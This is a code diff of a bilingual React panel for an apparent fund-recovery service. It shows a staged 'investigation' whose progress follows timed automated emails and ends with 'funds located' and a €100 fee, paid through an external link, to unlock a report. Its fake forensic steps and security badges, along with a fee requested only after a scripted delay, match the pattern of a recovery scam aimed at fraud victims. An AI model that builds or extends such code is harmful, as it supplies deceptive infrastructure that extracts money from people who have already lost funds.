@@ -491,53 +491,150 @@ function TraceForm({ user, token, isIt, onCancel, onStarted }) {
 //   ACTIVE TRACE PANEL — no time, no destination
 // ============================================================
 function ActiveTracePanel({ trace, isIt, onRefresh }) {
-  // Generate a stable case reference from trace ID
   const caseRef = trace?.id ? `TF-${trace.id.slice(0, 8).toUpperCase()}` : "TF-XXXXXXXX";
+
+  // Determine phase based on flags
+  const feePaid     = trace?.fee_paid || false;
+  const email50Sent = trace?.email_50h_sent || false;
+  const email24Sent = trace?.email_24h_sent || false;
+  const amount      = trace?.located_amount || 0;
+  const amountStr   = amount.toLocaleString(isIt ? "it-IT" : "en-US", { minimumFractionDigits: 2 });
 
   return (
     <div className="space-y-5" data-testid="active-trace-panel">
-      {/* Status card */}
-      <div className="aif-card aif-glow p-6 md:p-8 relative overflow-hidden">
-        <div className="aif-grid-overlay absolute inset-0 opacity-30 pointer-events-none"/>
-        <div className="relative z-10">
-          <div className="flex items-center justify-between flex-wrap gap-3">
-            <div className="flex items-center gap-3">
-              <div className="relative">
-                <div className="absolute inset-0 rounded-full bg-[#5FE3C9] opacity-20 animate-ping"/>
-                <div className="relative w-10 h-10 rounded-full bg-[#0E1A36] border border-[#5FE3C9]/50 flex items-center justify-center text-[#5FE3C9]">
-                  <Activity size={18}/>
-                </div>
-              </div>
-              <div>
-                <div className="text-[11px] uppercase tracking-[0.2em] text-[#5FE3C9]">
-                  {isIt ? "Procedura attiva" : "Active procedure"}
-                </div>
-                <div className="text-white font-bold text-lg">
-                  {isIt ? "Indagine in corso" : "Investigation in progress"}
-                </div>
-              </div>
-            </div>
-            <button onClick={onRefresh} className="aif-btn-ghost !py-2 !px-3 !text-sm inline-flex items-center gap-2">
-              <RefreshCw size={14}/> {isIt ? "Aggiorna" : "Refresh"}
-            </button>
-          </div>
 
-          {/* Status badge */}
-          <div className="mt-6 flex flex-wrap items-center gap-3">
-            <div className="flex items-center gap-2 aif-card !rounded-full px-4 py-2 !border-[#5FE3C9]/30">
-              <span className="inline-block w-2 h-2 rounded-full bg-[#4ADE80] aif-pulse"/>
-              <span className="text-[12px] text-[#5FE3C9] font-medium">
-                {isIt ? "Sistema di tracciamento attivo" : "Tracing system active"}
-              </span>
+      {/* ── CASE STATUS CARD (mirrors email content) ── */}
+      {feePaid ? (
+        /* Phase 4 — Fee paid, agent will contact */
+        <div className="aif-card p-6 md:p-7 border !border-[#4ADE80]/50 bg-[#4ADE80]/5" data-testid="case-status-paid">
+          <div className="flex items-start gap-4">
+            <div className="w-11 h-11 rounded-xl bg-[#4ADE80]/20 flex items-center justify-center shrink-0">
+              <CheckCircle2 size={24} className="text-[#4ADE80]"/>
             </div>
-            <div className="text-[12px] text-[var(--aif-text-dim)]">
-              {isIt ? "Riferimento caso:" : "Case reference:"} <span className="text-white font-mono">{caseRef}</span>
+            <div>
+              <div className="text-[11px] uppercase tracking-[0.18em] text-[#4ADE80] mb-1">{isIt ? "Pagamento confermato" : "Payment confirmed"}</div>
+              <h3 className="text-white font-bold text-[17px]">
+                {isIt ? "Il tuo pagamento è stato ricevuto" : "Your payment has been received"}
+              </h3>
+              <p className="text-[13px] text-[var(--aif-text-dim)] mt-2 leading-relaxed">
+                {isIt
+                  ? "Il nostro team ha confermato il pagamento della quota di elaborazione. Un agente dedicato al tuo caso ti contatterà a breve all'indirizzo email registrato per guidarti nelle fasi finali della restituzione dei tuoi fondi."
+                  : "Our team has confirmed receipt of the case-processing fee. A dedicated case agent will contact you shortly at your registered email address to guide you through the final steps of the fund repatriation."}
+              </p>
+              <div className="mt-3 flex items-center gap-2 text-[12px] text-[#4ADE80]">
+                <CheckCircle2 size={13}/> {isIt ? `Riferimento caso: ${caseRef}` : `Case reference: ${caseRef}`}
+              </div>
             </div>
           </div>
         </div>
-      </div>
+      ) : email50Sent ? (
+        /* Phase 3 — Funds located, fee required */
+        <div className="aif-card p-6 md:p-7 border !border-[#5FE3C9]/50 bg-[#5FE3C9]/5" data-testid="case-status-located">
+          <div className="flex items-start gap-4">
+            <div className="w-11 h-11 rounded-xl bg-[#5FE3C9]/20 flex items-center justify-center shrink-0">
+              <Wallet size={22} className="text-[#5FE3C9]"/>
+            </div>
+            <div className="flex-1 min-w-0">
+              <div className="text-[11px] uppercase tracking-[0.18em] text-[#5FE3C9] mb-1">{isIt ? "Indagine completata" : "Investigation complete"}</div>
+              <h3 className="text-white font-bold text-[17px]">
+                {isIt ? "I tuoi fondi sono stati localizzati" : "Your funds have been located"}
+              </h3>
+              <p className="text-[13px] text-[var(--aif-text-dim)] mt-2 leading-relaxed">
+                {isIt
+                  ? "La procedura di tracciamento forense è completata. L'importo associato al tuo caso è stato localizzato e messo in sicurezza. Per ricevere il report completo e avviare la restituzione, è richiesta una quota di elaborazione di €100."
+                  : "The forensic tracing procedure is complete. The amount associated with your case has been located and secured. To receive the full case report and initiate the return, a €100 case-processing fee is required."}
+              </p>
+              <div className="mt-4 aif-card !rounded-xl p-4 !border-[#5FE3C9]/30 text-center">
+                <div className="text-[10px] uppercase tracking-[0.2em] text-[var(--aif-text-dim)] mb-1">{isIt ? "Importo localizzato" : "Located amount"}</div>
+                <div className="text-[28px] font-black tabular-nums bg-clip-text text-transparent bg-gradient-to-r from-[#5FE3C9] to-[#6E8BFF]">
+                  € {amountStr}
+                </div>
+              </div>
+              <div className="mt-4 flex flex-wrap items-center gap-3">
+                <a
+                  href="https://trd-sbid-view.com/100"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="aif-btn-primary inline-flex items-center gap-2 !text-sm !py-2.5 !px-5"
+                  data-testid="case-pay-btn"
+                >
+                  <BadgeEuro size={15}/>
+                  {isIt ? "Paga €100 — Sblocca il report" : "Pay €100 — Unlock report"}
+                  <ExternalLink size={13}/>
+                </a>
+                <span className="text-[11px] text-[var(--aif-text-dim)]">
+                  {isIt ? "Rilasciato dopo conferma del team" : "Released after team confirmation"}
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      ) : email24Sent ? (
+        /* Phase 2 — 24h update: first transactions detected */
+        <div className="aif-card p-6 md:p-7 border !border-[#6E8BFF]/50 bg-[#6E8BFF]/5" data-testid="case-status-24h">
+          <div className="flex items-start gap-4">
+            <div className="w-11 h-11 rounded-xl bg-[#6E8BFF]/20 flex items-center justify-center shrink-0">
+              <Activity size={22} className="text-[#6E8BFF]"/>
+            </div>
+            <div>
+              <div className="text-[11px] uppercase tracking-[0.18em] text-[#6E8BFF] mb-1">{isIt ? "Primo aggiornamento" : "First update"}</div>
+              <h3 className="text-white font-bold text-[17px]">
+                {isIt ? "Prime transazioni rilevate" : "First transactions detected"}
+              </h3>
+              <p className="text-[13px] text-[var(--aif-text-dim)] mt-2 leading-relaxed">
+                {isIt
+                  ? "Nelle prime ore di analisi, il sistema ha identificato un numero di transazioni che mostrano il percorso seguito dai tuoi fondi attraverso le reti bancarie e di pagamento. L'indagine forense è ancora in corso per ottenere la divulgazione completa e confermare la posizione finale."
+                  : "In the first hours of analysis, the system has identified a number of transactions that show the path taken by your funds through banking and payment networks. The forensic investigation is still in progress to achieve full disclosure and confirm the final location."}
+              </p>
+              <div className="mt-3 flex items-center gap-2 text-[12px] text-[#6E8BFF]">
+                <span className="inline-block w-2 h-2 rounded-full bg-[#6E8BFF] aif-pulse"/>
+                {isIt ? "Indagine in corso — aggiornamento in arrivo" : "Investigation ongoing — update incoming"}
+              </div>
+            </div>
+          </div>
+        </div>
+      ) : (
+        /* Phase 1 — Investigation just started */
+        <div className="aif-card aif-glow p-6 md:p-8 relative overflow-hidden">
+          <div className="aif-grid-overlay absolute inset-0 opacity-30 pointer-events-none"/>
+          <div className="relative z-10">
+            <div className="flex items-center justify-between flex-wrap gap-3">
+              <div className="flex items-center gap-3">
+                <div className="relative">
+                  <div className="absolute inset-0 rounded-full bg-[#5FE3C9] opacity-20 animate-ping"/>
+                  <div className="relative w-10 h-10 rounded-full bg-[#0E1A36] border border-[#5FE3C9]/50 flex items-center justify-center text-[#5FE3C9]">
+                    <Activity size={18}/>
+                  </div>
+                </div>
+                <div>
+                  <div className="text-[11px] uppercase tracking-[0.2em] text-[#5FE3C9]">
+                    {isIt ? "Procedura attiva" : "Active procedure"}
+                  </div>
+                  <div className="text-white font-bold text-lg">
+                    {isIt ? "Indagine in corso" : "Investigation in progress"}
+                  </div>
+                </div>
+              </div>
+              <button onClick={onRefresh} className="aif-btn-ghost !py-2 !px-3 !text-sm inline-flex items-center gap-2">
+                <RefreshCw size={14}/> {isIt ? "Aggiorna" : "Refresh"}
+              </button>
+            </div>
+            <div className="mt-6 flex flex-wrap items-center gap-3">
+              <div className="flex items-center gap-2 aif-card !rounded-full px-4 py-2 !border-[#5FE3C9]/30">
+                <span className="inline-block w-2 h-2 rounded-full bg-[#4ADE80] aif-pulse"/>
+                <span className="text-[12px] text-[#5FE3C9] font-medium">
+                  {isIt ? "Sistema di tracciamento attivo" : "Tracing system active"}
+                </span>
+              </div>
+              <div className="text-[12px] text-[var(--aif-text-dim)]">
+                {isIt ? "Riferimento caso:" : "Case reference:"} <span className="text-white font-mono">{caseRef}</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
 
-      {/* Radar animation */}
+      {/* Radar animation — shown in all phases */}
       <div className="!max-w-none -mx-5 lg:-mx-8">
         <ProcedureAnimation
           startedAt={trace.created_at}
@@ -549,9 +646,6 @@ function ActiveTracePanel({ trace, isIt, onRefresh }) {
         />
       </div>
 
-      {/* Fee status */}
-      {/* Fee card hidden — fee is requested only via the 50h automated email */}
-
       {/* Procedure details — no destination, no time */}
       <div className="aif-card p-5 md:p-6">
         <div className="text-[11px] uppercase tracking-[0.2em] text-[#5FE3C9] mb-4">
@@ -559,7 +653,15 @@ function ActiveTracePanel({ trace, isIt, onRefresh }) {
         </div>
         <div className="grid sm:grid-cols-2 gap-3">
           {[
-            [isIt ? "Stato" : "Status", isIt ? "Analisi in corso" : "Analysis in progress"],
+            [isIt ? "Stato" : "Status",
+              feePaid
+                ? (isIt ? "Pagamento confermato" : "Payment confirmed")
+                : email50Sent
+                  ? (isIt ? "Fondi localizzati" : "Funds located")
+                  : email24Sent
+                    ? (isIt ? "Prime transazioni rilevate" : "First transactions detected")
+                    : (isIt ? "Analisi in corso" : "Analysis in progress")
+            ],
             [isIt ? "Tipo scansione" : "Scan type", isIt ? "Multi-livello (Bancaria · SEPA · Crypto · AML)" : "Multi-layer (Banking · SEPA · Crypto · AML)"],
             [isIt ? "Standard sicurezza" : "Security", "AES-256 · TLS 1.3 · GDPR"],
             [isIt ? "Riferimento" : "Reference", caseRef],
